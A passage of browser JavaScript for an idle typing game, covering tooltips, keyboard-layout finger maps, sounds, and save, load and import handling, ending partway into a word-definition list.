
const tooltip = document.createElement('div');
tooltip.className = 'tooltip';

const tooltipBackground = document.createElement('div');
tooltipBackground.className = 'tooltip-background';

const tooltipBody = document.createElement('div');
tooltipBody.className = 'tooltip-body';

const tooltipHead = document.createElement('div');
tooltipHead.className = 'tooltip-header';

const tooltipSection = document.createElement('div');
tooltipSection.className = 'tooltip-section';

tooltipBody.appendChild(tooltipHead);
tooltipBody.appendChild(tooltipSection);
tooltipBackground.appendChild(tooltipBody);
tooltip.appendChild(tooltipBackground);
document.body.appendChild(tooltip);

function hideTooltip() {
    tooltip.classList.remove('visible');
}
/**
 * This prefers to position the tooltip above the element, then below, then left, then right.
 * @param {*} element The element to position the tooltip relative to
 */
function setToolTipPos(element) {
    const rect = element.getBoundingClientRect();
    const tooltipHeight = tooltip.offsetHeight;
    const tooltipWidth = tooltip.offsetWidth;
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;
    
    // Calculate potential positions
    const topPosition = rect.top - tooltipHeight;
    const bottomPosition = rect.bottom;
    const leftPosition = rect.left - tooltipWidth;
    const rightPosition = rect.right;
    const centeredLeftPosition = rect.left + (rect.width / 2) - (tooltipWidth / 2);
    const clampedLeftPosition = Math.min(
        Math.max(centeredLeftPosition, 0),
        windowWidth - tooltipWidth
    );
    
    // Determine vertical placement (above or below)
    if (topPosition >= 0) {
        tooltip.style.top = `${topPosition}px`;
        tooltip.style.left = `${clampedLeftPosition}px`;
    } else if (bottomPosition + tooltipHeight <= windowHeight) {
        tooltip.style.top = `${bottomPosition}px`;
        tooltip.style.left = `${clampedLeftPosition}px`;
    } else if (leftPosition >= 0) {
        // If it doesn't fit above or below, try to position on the left
        tooltip.style.top = `${rect.top + (rect.height / 2) - (tooltipHeight / 2)}px`;
        tooltip.style.left = `${leftPosition}px`;
    } else if (rightPosition + tooltipWidth <= windowWidth) {
        // If it doesn't fit on the left, try the right
        tooltip.style.top = `${rect.top + (rect.height / 2) - (tooltipHeight / 2)}px`;
        tooltip.style.left = `${rightPosition}px`;
    } else {
        // Default to showing it below and centered if no other options fit
        tooltip.style.top = `${bottomPosition}px`;
        tooltip.style.left = `${clampedLeftPosition}px`;
    }
}

/**
 * This prefers to position the tooltip left of the element, then right, then above, then below.
 * @param {*} element The element to position the tooltip relative to
 */
function setToolTipPos2(element) {
    const rect = element.getBoundingClientRect();
    const tooltipHeight = tooltip.offsetHeight;
    const tooltipWidth = tooltip.offsetWidth;
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;
    
    // Calculate potential positions
    const leftPosition = rect.left - tooltipWidth;
    const rightPosition = rect.right;
    const topPosition = rect.top - tooltipHeight;
    const bottomPosition = rect.bottom;
    const centeredTopPosition = rect.top + (rect.height / 2) - (tooltipHeight / 2);
    const clampedTopPosition = Math.min(
        Math.max(centeredTopPosition, 0),
        windowHeight - tooltipHeight
    );
    
    // Determine horizontal placement (left or right)
    if (leftPosition >= 0) {
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${leftPosition}px`;
    } else if (rightPosition + tooltipWidth <= windowWidth) {
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${rightPosition}px`;
    } else if (topPosition >= 0) {
        // If it doesn't fit left or right, try to position above
        tooltip.style.top = `${topPosition}px`;
        tooltip.style.left = `${rect.left + (rect.width / 2) - (tooltipWidth / 2)}px`;
    } else if (bottomPosition + tooltipHeight <= windowHeight) {
        // If it doesn't fit above, try below
        tooltip.style.top = `${bottomPosition}px`;
        tooltip.style.left = `${rect.left + (rect.width / 2) - (tooltipWidth / 2)}px`;
    } else {
        // Default to showing it right of the element if no other options fit
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${rightPosition}px`;
    }
}

/**
 * This prefers to position the tooltip right of the element, then left, then above, then below.
 * @param {*} element The element to position the tooltip relative to
 */
function setToolTipPos3(element) {
    const rect = element.getBoundingClientRect();
    const tooltipHeight = tooltip.offsetHeight;
    const tooltipWidth = tooltip.offsetWidth;
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;
    
    // Calculate potential positions
    const rightPosition = rect.right;
    const leftPosition = rect.left - tooltipWidth;
    const topPosition = rect.top - tooltipHeight;
    const bottomPosition = rect.bottom;
    const centeredTopPosition = rect.top + (rect.height / 2) - (tooltipHeight / 2);
    const clampedTopPosition = Math.min(
        Math.max(centeredTopPosition, 0),
        windowHeight - tooltipHeight
    );
    
    // Determine horizontal placement (right or left)
    if (rightPosition + tooltipWidth <= windowWidth) {
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${rightPosition}px`;
    } else if (leftPosition >= 0) {
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${leftPosition}px`;
    } else if (topPosition >= 0) {
        // If it doesn't fit right or left, try to position above
        tooltip.style.top = `${topPosition}px`;
        tooltip.style.left = `${rect.left + (rect.width / 2) - (tooltipWidth / 2)}px`;
    } else if (bottomPosition + tooltipHeight <= windowHeight) {
        // If it doesn't fit above, try below
        tooltip.style.top = `${bottomPosition}px`;
        tooltip.style.left = `${rect.left + (rect.width / 2) - (tooltipWidth / 2)}px`;
    } else {
        // Default to showing it right of the element if no other options fit
        tooltip.style.top = `${clampedTopPosition}px`;
        tooltip.style.left = `${rightPosition}px`;
    }
}

function showBuildingTooltip(buildingElement, building) {
    if(building.locked) {
        tooltip.style.backgroundImage = `url("/images/tooltips/buildings/448/locked.jpg")`;
        tooltipHead.innerHTML = `<h1>Locked Building</h1>`;
        tooltipSection.innerHTML = `<p>${building.lockdescription}</p>`;
    } else {
        tooltip.style.backgroundImage = `url("/images/tooltips/buildings/448/${building.id}.jpg")`;
        tooltipHead.innerHTML = `<h1>${building.name}</h1>`;
        let researchHtml = '';
        let currentBoost = getSpecialBoost(building);
        if(currentBoost.length > 0) {
            currentBoost = `
                <li><strong>${currentBoost}</strong></li>
            `;
        }
        if(typeof building.getResearchProduceSingle === "function") {
            researchHtml = `
                <li>Each <strong>${building.name}</strong> produces <strong><img src="/images/icons/128/research-bulb-icon.png" class="researchicon" alt="Research">${building.getResearchProduceSingle().toFixed(2)} per second.</strong></li>
                <li><strong>${building.level} ${building.name}s</strong> produces <strong><img src="/images/icons/128/research-bulb-icon.png" class="researchicon" alt="Research">${formatShortScale(building.getResearchProduce())} per second.</strong></li>
            `;
        }
        tooltipSection.innerHTML = `
        <p>${building.description}</p>
        <ul class="tooltip-stats">
            <li><strong>${building.special}</strong></li>
            ${currentBoost}
            <li>Each <strong>${building.name}</strong> produces <strong><img src="/images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(building.getProduceSingle())} per second.</strong></li>
            <li><strong>${building.level} ${building.name}s</strong> produces <strong><img src="/images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(building.getProduce())} per second.</strong></li>
            <li><strong>Total produced: <img src="/images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(building.totalProduce)}</strong></li>
        ${researchHtml}
        </ul>
        <p class="trivia">"${building.trivia}"</p>`;
    }
    setToolTipPos2(buildingElement);
    tooltip.classList.add('visible');
}


function showOwnedUpgradeToolTip(upgradeElement, upgrade) {
    tooltip.style.backgroundImage = `url("/images/tooltips/upgrades/448/${upgrade.id}.jpg")`;
    tooltipHead.innerHTML = `<h1>${upgrade.name}</h1>`;
    tooltipSection.innerHTML = `
    <p>${upgrade.description}</p>
    <p class="trivia">"${upgrade.trivia}"</p>`;
    setToolTipPos3(upgradeElement);
    tooltip.classList.add('visible');
}

function showUpgradeToolTip(upgradeElement, upgrade) {
    tooltip.style.backgroundImage = `url("/images/tooltips/upgrades/448/${upgrade.id}.jpg")`;
    tooltipHead.innerHTML = `<h1>${upgrade.name}</h1>`;
    tooltipSection.innerHTML = `
    <p>${upgrade.description}</p>
    <p class="trivia">"${upgrade.trivia}"</p>
    <img src="/images/icons/128/research-bulb-icon.png" class="researchicon" alt="Research"> <span>${formatShortScale(upgrade.cost)}</span>`;
    setToolTipPos2(upgradeElement);
    tooltip.classList.add('visible');
}

function showCurrentResearchCountTooltip(element) {
    tooltip.style.backgroundImage = `url("/images/tooltips/buildings/448/3.jpg")`; // research building
    tooltipHead.innerHTML = `<h1>Research Points</h1>`;
    tooltipSection.innerHTML = `<p>Research points allow you to unlock valuable upgrades for your buildings.</p>`;
    setToolTipPos(element); 
    tooltip.classList.add('visible');
}

function showStockBuyTooltip(element, count, stock) {
    tooltip.style.backgroundImage = `url("${stock.icon}")`;
    tooltipHead.innerHTML = `
    <h1>${stock.name}</h1>
    <h2>Buy Stocks</h2>`;
    tooltipSection.innerHTML = `
    <p>Buy ${count} stocks at $${formatShortScale(count * stock.price)} (<img src="images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(dollarsToKeystrokes(count * stock.price))})</p>`;
    setToolTipPos(element); 
    tooltip.classList.add('visible');
}
function showStockSellTooltip(element, count, stock) {
    tooltip.style.backgroundImage = `url("${stock.icon}")`;
    tooltipHead.innerHTML = `
    <h1>${stock.name}</h1>
    <h2>Sell Stocks</h2>`;
    tooltipSection.innerHTML = `
    <p>Sell ${count} stocks for $${formatShortScale(count * stock.price)} (<img src="images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(dollarsToKeystrokes(count * stock.price))})</p>`;
    setToolTipPos(element); 
    tooltip.classList.add('visible');
}
function showAchievementTooltip(element, achievement) {
    if(achievement.unlocked) {
        tooltip.style.backgroundImage = 'none';
        tooltip.style.backgroundColor = 'var(--panel-bg)';
        tooltipHead.innerHTML = `<div style="display: flex; align-items: center; gap: 10px;">
            <span style="font-size: 2rem;">${achievement.emoji || '🏆'}</span>
            <h1>${achievement.name}</h1>
        </div>`;
        tooltipSection.innerHTML = `
    <p>${achievement.description}</p>
    <p class="trivia">"${achievement.trivia}"</p>`;
    } else {
        tooltip.style.backgroundImage = 'none';
        tooltip.style.backgroundColor = 'var(--panel-bg)';
        tooltipHead.innerHTML = `<div style="display: flex; align-items: center; gap: 10px;">
            <span style="font-size: 2rem;">🔒</span>
            <h1>Hidden Achievement</h1>
        </div>`;
        tooltipSection.innerHTML = `<p>Unlock this achievement to reveal it.</p>`;
    }
    setToolTipPos3(element);
    tooltip.classList.add('visible');
}

function showBuffTooltip(element, buff) {
    tooltip.style.backgroundImage = `url("${buff.icon}")`;
    tooltipHead.innerHTML = `<h1>${buff.name}</h1>`;
    tooltipSection.innerHTML = buff.description
    setToolTipPos(element); 
    tooltip.classList.add('visible');
}

/*
let researchPointsDiv = document.getElementById("researchPointsDiv");
researchPointsDiv.addEventListener('mouseover', () => showCurrentResearchCountTooltip(researchPointsDiv));
researchPointsDiv.addEventListener('mouseout', () => hideTooltip());
*/
/*
  Fingers:
  a = left pinky
  b = left ring
  c = left middle
  d = left index
  e = left thumb  (not used in these rows)
  f = right thumb (not used in these rows)
  g = right index
  h = right middle
  i = right ring
  j = right pinky
*/

const keyboardLayouts = {
    'qwerty-nordic': {
      row: [
        'QWERTYUIOPÅ¨',  // 12 chars
        'ASDFGHJKLÖÄ\'', // 12 chars
        '<ZXCVBNM,.-'    // 11 chars
      ],
      fingers: [
        // QWERTYUIOPÅ¨
        // Q W E R T | Y U | I | O | P Å ¨
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // ASDFGHJKLÖÄ'
        // A S D F G | H J | K | L | Ö Ä '
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // <ZXCVBNM,.-
        // < Z | X | C | V B | N M | , . -
        // a  a | b | c | d d | g g | h i j
        'aabcddgghij'
      ],
      margins: ['0','2rem','-6rem'],
      handMargin: '2rem',
      bumps: 'FJ'
    },
  
    'qwerty-us': {
      row: [
        'QWERTYUIOP[]', // 12 chars
        'ASDFGHJKL;\'', // 11 chars
        'ZXCVBNM,./'    // 10 chars
      ],
      fingers: [
        // QWERTYUIOP[]
        // Q W E R T | Y U | I | O | P [ ]
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // ASDFGHJKL;'
        // A S D F G | H J | K | L | ; '
        // a b c d d | g g | h | i | j j
        'abcddgghijj',
  
        // ZXCVBNM,./
        // Z X C V B | N M | , . /
        // a b c d d | g g | h i j
        'abcddgghij'
      ],
      margins: ['0','-3rem','-3rem'],
      handMargin: '0.9rem',
      bumps: 'FJ'
    },
  
    'qwerty-uk': {
      row: [
        'QWERTYUIOP[]',   // 12 chars
        'ASDFGHJKL;\'#',  // 12 chars
        'ZXCVBNM,./'      // 10 chars
      ],
      fingers: [
        // QWERTYUIOP[]
        // => same pattern as qwerty-us top row
        'abcddgghijjj',
  
        // ASDFGHJKL;'#
        // A S D F G | H J | K | L | ; ' #
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // ZXCVBNM,./
        // => same pattern as qwerty-us bottom row
        'abcddgghij'
      ],
      margins: ['0','1.1rem','-3rem'],
      handMargin: '1.1rem',
      bumps: 'FJ'
    },
  
    'dvorak': {
      row: [
        // As given:  "',.PYFGCRL/="
        "'.,PYFGCRL/=", // 12 chars
        // "AOEUIDHTNS-"
        'AOEUIDHTNS-',  // 11 chars
        // ";QJKXBMWVZ"
        ';QJKXBMWVZ'    // 10 chars
      ],
      fingers: [
        // '.,PYFGCRL/=
        // ' , . P  Y | F G | C | R | L / =
        // a b c d  d | g g | h | i | j j j
        'abcddgghijjj',
  
        // AOEUIDHTNS-
        // A O E U I | D H | T | N | S -
        // a b c d d | g g | h | i | j j
        'abcddgghijj',
  
        // ;QJKXBMWVZ
        // ; Q | J | K | X B | M W | V | Z
        // a b | c | d | d g | g h | i | j
        //  (10 chars)
        'abcddgghij'
      ],
      margins: ['0','-3rem','-3rem'],
      handMargin: '0.9rem',
      bumps: 'UH'
    },
  
    'azerty': {
      row: [
        'AZERTYUIOP¨£', // 12 chars
        'QSDFGHJKLMù*', // 12 chars
        '<WXCVBN,;:!'   // 11 chars
      ],
      fingers: [
        // AZERTYUIOP¨£
        // A Z E R T | Y U | I | O | P ¨ £
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // QSDFGHJKLMù*
        // Q S D F G | H J | K | L | M ù *
        // a b c d d | g g | h | i | j j j
        'abcddgghijjj',
  
        // <WXCVBN,;:!
        // < W | X | C | V B | N , | ; : !
        // a a | b | c | d d | g g | h i j
        'aabcddgghij'
      ],
      margins: ['0','1rem','-9rem'],
      handMargin: '1rem',
      bumps: 'FJ'
    }
  };
  /*
    Single-character codes -> Friendly names
  */
  const fingerNames = {
    a: 'Left Pinky',
    b: 'Left Ring',
    c: 'Left Middle',
    d: 'Left Index',
    e: 'Left Thumb',
    f: 'Right Thumb',
    g: 'Right Index',
    h: 'Right Middle',
    i: 'Right Ring',
    j: 'Right Pinky'
  };
  
  /**
   * This function uses the fingerNames map to return the friendly name
    instead of the single-character code.
   * @param {*} layoutName 
   * @param {*} key 
   * @returns 
   */
  function getProperFingerName(layoutName, key) {
    // First, get the single-character code for the finger.
    const fingerCode = getProperFinger(layoutName, key);
  
    // Use our fingerNames map to convert the code into a friendly string.
    // If the code doesn't exist in fingerNames, default to "Unknown".
    return fingerNames[fingerCode] || 'Unknown';
  }
  
  /**
   * The basic function that returns the single-character code
    (i.e. 'a', 'b', 'c', etc.).
   * @param {*} layoutName
   * @param {*} key 
   * @returns 
   */
  function getProperFinger(layoutName, key) {
    // Retrieve the layout object
    const layout = keyboardLayouts[layoutName];
    if (!layout) {
      throw new Error(`Unknown layout: ${layoutName}`);
    }
  
    // Search each row of the layout
    for (let rowIndex = 0; rowIndex < layout.row.length; rowIndex++) {
      const rowKeys = layout.row[rowIndex];           // e.g., "QWERTYUIOPÅ¨"
      const fingerAssignments = layout.fingers[rowIndex]; // e.g., "abcddgghijjj"
  
      // By default, we'll do exact match. For case-insensitivity, do something like:
      // const keyPos = rowKeys.toUpperCase().indexOf(key.toUpperCase());
      const keyPos = rowKeys.indexOf(key);
  
      if (keyPos !== -1) {
        // Return the single-character code (a/b/c/d/g/h/i/j)
        return fingerAssignments[keyPos] || '';
      }
    }
  
    // If the key isn't found in any row, return empty or handle as needed
    return '';
  }




//================================================================================================
// Main game keyboard logic:
function renderGameKeyboard() {
    const keyboardContainer = document.getElementById('game-keyboard');
    keyboardContainer.innerHTML = '';
    const layout = keyboardLayouts[keyboardLayout].row;
    const margins = keyboardLayouts[keyboardLayout].margins;
    const bumps = keyboardLayouts[keyboardLayout].bumps;
    layout.forEach((row, index) => {
        const rowElement = document.createElement('div');
        rowElement.className = 'game-keyboard-row';
        rowElement.style.marginLeft = margins[index];
        row.split('').forEach(key => {
            const keyElement = document.createElement('div');
            keyElement.className = 'game-key';
            if(bumps.includes(key)) keyElement.classList.add('bump');
            if(!legalKeys.includes(key)) keyElement.classList.add('disabled');
            keyElement.textContent = key;
            keyElement.setAttribute('data-key', key);
            rowElement.appendChild(keyElement);
        });
        keyboardContainer.appendChild(rowElement);
    });
    document.getElementById('hand').style.marginLeft = keyboardLayouts[keyboardLayout].handMargin;
}



function highlightNextKey() {
    let mistakeFound = false;
    const inputText = document.getElementById('input-box').value.trim();
    for(let i = 0; i < inputText.length; i++) {
        if(inputText[i] !== wordsToType[currentWordIndex][i]) {
            mistakeFound = true;
            break;
        }
    }
    if(inputText.length > wordsToType[currentWordIndex].length) mistakeFound = true;
    if(inputText.length === 0) mistakeFound = false;
    if(mistakeFound) {
        document.querySelectorAll('.game-key').forEach(keyElement => {
            keyElement.classList.remove('highlight');
            keyElement.classList.add('invalid');
        }); 
        document.querySelectorAll('.finger').forEach(finger => {
            finger.classList.remove('highlight-finger');
        });
    } else {
        if(inputText.length === wordsToType[currentWordIndex].length) {
            document.querySelectorAll('.game-key').forEach(keyElement => {
                keyElement.classList.remove('invalid');
                keyElement.classList.add('highlight');
            }); 
        } else {
            const nextKey = wordsToType[currentWordIndex][inputText.length].toUpperCase();
            document.querySelectorAll('.game-key').forEach(keyElement => {
                keyElement.classList.remove('invalid');
                if (keyElement.getAttribute('data-key') === nextKey) {
                    keyElement.classList.add('highlight');
                } else {
                    keyElement.classList.remove('highlight');
                }
            });
            
            const fingerName = getProperFingerName(keyboardLayout, nextKey.toUpperCase());
            document.querySelectorAll('.finger').forEach(finger => {
                finger.classList.remove('highlight-finger');
                finger.classList.remove('toprow');
                finger.classList.remove('midrow');
                finger.classList.remove('botrow');
            });
            const fingerElement = document.getElementById(fingerName.toLowerCase().replace(' ', '-'));
            if(fingerElement) {
                document.getElementById('finger-guide').innerHTML = `Use your <strong>${fingerName}</strong> finger to type the next key.`;
                fingerElement.classList.add('highlight-finger');
                const rowIndex = keyboardLayouts[keyboardLayout].row.findIndex(row => row.includes(nextKey));
                if (rowIndex === 0) {
                    fingerElement.classList.add('toprow');
                } else if (rowIndex === 1) {
                    fingerElement.classList.add('midrow');
                } else if (rowIndex === 2) {
                    fingerElement.classList.add('botrow');
                }
            } else {
                document.getElementById('finger-guide').textContent = '';
            }
        }
    }
}
//================================================================================================


// Wordle keyboard logic: 
function renderWordleKeyboard() {
    const keyboardContainer = document.getElementById('wordle-keyboard');
    keyboardContainer.innerHTML = '';
    const layout = keyboardLayouts[keyboardLayout].row;
    const margins = keyboardLayouts[keyboardLayout].margins;
    const bumps = keyboardLayouts[keyboardLayout].bumps;
    layout.forEach((row, index) => {
      const rowElement = document.createElement('div');
      rowElement.className = 'wordle-keyboard-row';
      rowElement.style.marginLeft = margins[index];
      row.split('').forEach(key => {
        const keyElement = document.createElement('div');
        keyElement.className = 'wordle-key';
        if(bumps.includes(key)) keyElement.classList.add('bump');
        keyElement.textContent = key;
        keyElement.setAttribute('data-key', key);
        if(legalKeys.includes(key)) {
        keyElement.addEventListener('click', () => handleKeyClick(key));
        } else {
          keyElement.classList.add("illegal-key");
        }
        rowElement.appendChild(keyElement);
      });
      keyboardContainer.appendChild(rowElement);
    });
  }
  
  function handleKeyClick(key) {
      const activeRow = document.querySelector('.wordle-guess-row .wordle-tile[contenteditable="true"]');
      if (activeRow) {
          const row = activeRow.parentNode;
          const tiles = Array.from(row.getElementsByClassName('wordle-tile'));
          if (focusedTile) {
            console.log("focus");
            focusedTile.textContent = key;
            handleTileInput({ target: focusedTile });
            return;
          }
          const emptyTile = tiles.find(tile => tile.textContent === '');
          if (emptyTile) {
              emptyTile.textContent = key;
              handleTileInput({ target: emptyTile });
          }
      }
  }
  
// Function to play sound
function playSound(soundId) 
{
    const sound = document.getElementById(soundId);
    sound.play();
}


let currentTypeTrack = 1;
let currentBuyTrack = 1;
let currentMenuTrack = 1;
let currentExplosionTrack = 1;
let currentSlotWinTrack = 1;
let currentSlotFallTrack = 1;
function playTypeSound() {
    playSound(`typeSound${currentTypeTrack}`);
    currentTypeTrack++;
    if(currentTypeTrack > 3) {
        currentTypeTrack = 1;
    }
}

function playBuySound() {
    playSound(`buySound${currentBuyTrack}`);
    currentBuyTrack++;
    if(currentBuyTrack > 3) {
        currentBuyTrack = 1;
    }
}
function playMenuSound() {
    playSound(`menuSound${currentMenuTrack}`);
    currentMenuTrack++;
    if(currentMenuTrack > 3) {
        currentMenuTrack = 1;
    }
}
function playExplosionSound() {
    playSound(`explosionSound${currentExplosionTrack}`);
    currentExplosionTrack++;
    if(currentExplosionTrack > 3) {
        currentExplosionTrack = 1;
    }
}
function playSlotWinSound() {
    playSound(`slotWinSound${currentSlotWinTrack}`);
    currentSlotWinTrack++;
    if(currentSlotWinTrack > 3) {
        currentSlotWinTrack = 1;
    }
}
function playSlotFallSound() {
    playSound(`slotFallSound${currentSlotFallTrack}`);
    currentSlotFallTrack++;
    if(currentSlotFallTrack > 3) {
        currentSlotFallTrack = 1;
    }
}
function playTypoSound() {
    playLoseSound();
}
function playClickSound() {
    playSound("clickSound");
}
function playAchievementSound() {
    playSound("achievementSound");
}
function playWinSound() {
    playSound("winSound");
}
function playLoseSound() {
    playSound("loseSound");
}

let totalKeystrokes = 0;
let manualKeystrokes = 0;
let cashEarnedManually = 0;
let cashEarnedBuildings = 0;

let practiceHistory = []; // Array to store typing test results

/**
 * This will 'scroll' to keystrokesBank.
 */
let scrollingKeystrokesBank = 0;
let scrollingPassiveIncome = 0;
let scrollingWpm = 0;
let keystrokesBank = 0;
let wordlesSolved = 0;
let skipOnMistake = false;
let volume = 1;
let lastSave = Date.now();
let autosave = true;
let arenaGoldMedals = 0;
let arenaBeatNormal = 0;
let arenaBeatHard = 0;
let arenaBeatVeryHard = 0;
let stockProfitDollars = 0; // Profit in dollars
let stockProfitKeystrokes = 0; // Profit in keystrokes
let goldNewsClicks = 0;
let currentGuildTask = '';
let keyboardLayout = 'qwerty-nordic';
let tenFingerAssitance = false;
let currentTheme = 'dark';
let guildName = '';
let wpm = 0;
let scrollingWpmMultiplier = 1;

function saveGame() {
    lastSave = Date.now();
    const gameData = {
        totalKeystrokes,
        manualKeystrokes,
        keystrokesBank,
        totalResearchPoints,
        cashEarnedManually,
        cashEarnedBuildings,
        wordlesSolved,
        skipOnMistake,
        volume,
        lastSave,
        arenaGoldMedals,
        arenaBeatNormal,
        arenaBeatHard,
        arenaBeatVeryHard,
        stockProfitDollars,
        stockProfitKeystrokes,
        goldNewsClicks,
        currentGuildTask,
        keyboardLayout,
        currentTheme,
        tenFingerAssitance,
        practiceHistory,
        guildName,
        buildings: buildings.map(building => ({ id: building.id, level: building.level, totalProduce: building.totalProduce })),
        upgrades: upgrades.map(upgrade => ({ id: upgrade.id, unlocked: upgrade.unlocked })),
        achievements: achievements.map(achievement => ({ id: achievement.id, unlocked: achievement.unlocked })),
        stocks: stocks.map(stock => ({
            id: stock.id,
            price: stock.price,
            owned: stock.owned,
            history: stock.history
        })),
        transactionHistory: transactionHistory,
        buffs: modifiers.filter(mod => mod.duration).map(mod => ({
            boostID: mod.boostID,
            duration: mod.duration
        })),
        wordle: {
            currentWord: currentWordleWord
        }
    };
    localStorage.setItem('typingGameSaveV3', JSON.stringify(gameData));
    return gameData;
}

function loadLocalSave() {
    loadGame(JSON.parse(localStorage.getItem('typingGameSaveV3')));
}

function loadGame(savedData) {
    if (savedData) {
        totalKeystrokes = savedData.totalKeystrokes;
        manualKeystrokes = savedData.manualKeystrokes;
        keystrokesBank = savedData.keystrokesBank;
        totalResearchPoints = savedData.totalResearchPoints;
        cashEarnedManually = savedData.cashEarnedManually;
        cashEarnedBuildings = savedData.cashEarnedBuildings;
        wordlesSolved = savedData.wordlesSolved;
        skipOnMistake = savedData.skipOnMistake ?? false;
        volume = savedData.volume ?? 1;
        lastSave = savedData.lastSave ?? Date.now();
        arenaGoldMedals = savedData.arenaGoldMedals || 0;
        arenaBeatNormal = savedData.arenaBeatNormal || 0;
        arenaBeatHard = savedData.arenaBeatHard || 0;
        arenaBeatVeryHard = savedData.arenaBeatVeryHard || 0;
        stockProfitDollars = savedData.stockProfitDollars || 0;
        stockProfitKeystrokes = savedData.stockProfitKeystrokes || 0;
        goldNewsClicks = savedData.goldNewsClicks || 0;
        currentGuildTask = savedData.currentGuildTask || '';
        keyboardLayout = savedData.keyboardLayout || 'qwerty-nordic';
        currentTheme = savedData.currentTheme || 'dark';
        tenFingerAssitance = savedData.tenFingerAssitance || false;
        practiceHistory = savedData.practiceHistory || [];
        guildName = savedData.guildName || '';
        
        savedData.buildings.forEach(savedBuilding => {
            const building = buildings.find(b => b.id === savedBuilding.id);
            if (building) {
                building.level = savedBuilding.level;
                building.totalProduce = savedBuilding.totalProduce || 0;
            }
        });
        
        savedData.upgrades.forEach(savedUpgrade => {
            const upgrade = upgrades.find(u => u.id === savedUpgrade.id);
            if (upgrade) {
                upgrade.unlocked = savedUpgrade.unlocked;
                if (upgrade.unlocked) {
                    upgrade.effect();
                }
            }
        });
        
        savedData.achievements.forEach(savedAchievement => {
            const achievement = achievements.find(a => a.id === savedAchievement.id);
            if (achievement) {
                achievement.unlocked = savedAchievement.unlocked;
            }
        });
        
        // Load stocks
        if (savedData.stocks) {
            savedData.stocks.forEach(savedStock => {
            const stock = stocks.find(s => s.id === savedStock.id);
            if (stock) {
                stock.price = savedStock.price;
                stock.owned = savedStock.owned;
                stock.history = savedStock.history || [];
            }
            });
        }
        // Load Wordle state
        if (savedData.wordle) {
            currentWordleWord = savedData.wordle.currentWord || "";
            wordleUIState = "load";
        }
        
        // Load transaction history
        if (savedData.transactionHistory) {
            loadTransactionHistory(savedData.transactionHistory);
        }
        
        if (savedData.buffs) {
            savedData.buffs.forEach(savedBuff => {
                spawnBoost(savedBuff.boostID, savedBuff.duration);
            });
        }
        
        const now = Date.now();
        const offlineTime = (now - (savedData.lastSave || now)) / 1000;
        if(CyberCafe.level > 0) {
            const offlineProduction = offlineTime * getPassiveIncomeWithoutTempBoosts() * (1 - Math.pow(0.9995, CyberCafe.level));
            keystrokesBank += offlineProduction;
            totalKeystrokes += offlineProduction;
            cashEarnedBuildings += offlineProduction;
            showNotification(
                `<h1>Welcome back!</h1>
                <h2>Offline Earnings</h2>`,
                `<p><strong>Offline Earnings:</strong> <img src="images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin">${formatShortScale(offlineProduction)} from Cyber Cafes!</p>`,
                `url('images/tooltips/buildings/448/${CyberCafe.id}.jpg')`
            );
        }
    } else {
        console.log('No save data found.');
    }
}

function resetGame() {
    autosave = false;
    localStorage.removeItem('typingGameSaveV3');
    location.reload();
}

document.getElementById('export-button').addEventListener('click', () => {
    const saveData = JSON.stringify(saveGame());
    const blob = new Blob([saveData], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'typeidle_save.json';
    a.click();
    URL.revokeObjectURL(url);
    gtag('event', 'save_export', {
        'event_category': 'Save'
      });
});

document.getElementById('import-button-string').addEventListener('click', () => {
    const saveData = document.getElementById('import-textarea').value;
    if (saveData) {
        gtag('event', 'save_import_string', {
            'event_category': 'Save'
          });
        autosave = false;
        localStorage.setItem('typingGameSaveV3', saveData);
        location.reload();
    }
});

document.getElementById('export-button-string').addEventListener('click', () => {
    const saveData = JSON.stringify(saveGame());
    document.getElementById('export-textarea').value = saveData;
    gtag('event', 'save_export_string', {
        'event_category': 'Save'
      });
});

document.getElementById('import-button').addEventListener('click', () => {
    document.getElementById('import-file').click();
});

document.getElementById('import-file').addEventListener('change', (event) => {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            gtag('event', 'save_import', {
                'event_category': 'Save'
              });
            autosave = false;
            const saveData = JSON.parse(e.target.result);
            localStorage.setItem('typingGameSaveV3', JSON.stringify(saveData));
            location.reload();
        };
        reader.readAsText(file);
    }
});
const wordsList = {
    "ability": {
        "definition": "possession of the means or skill to do something",
        "example": "Her ability to solve complex problems quickly impressed everyone."
    },
    "able": {
        "definition": "having the power, skill, means, or opportunity to do something",
        "example": "He was able to finish the marathon despite the pain."
    },
    "about": {
        "definition": "on the subject of; concerning",
        "example": "She is reading a book about ancient civilizations."
    },
    "above": {
        "definition": "at a higher level or layer",
        "example": "The airplane flew above the clouds."
    },
    "accept": {
        "definition": "consent to receive or undertake (something offered)",
        "example": "She decided to accept the job offer."
    },
    "according": {
        "definition": "as stated by or in",
        "example": "According to the weather forecast, it will rain tomorrow."
    },
    "account": {
        "definition": "a report or description of an event or experience",
        "example": "He gave a detailed account of his travels."
    },
    "across": {
        "definition": "from one side to the other",
        "example": "They walked across the bridge."
    },
    "action": {
        "definition": "the fact or process of doing something, typically to achieve an aim",
        "example": "The government promised swift action to tackle the problem."
    },
    "activity": {
        "definition": "the condition in which things are happening or being done",
        "example": "Physical activity is essential for good health."
    },
    "actually": {
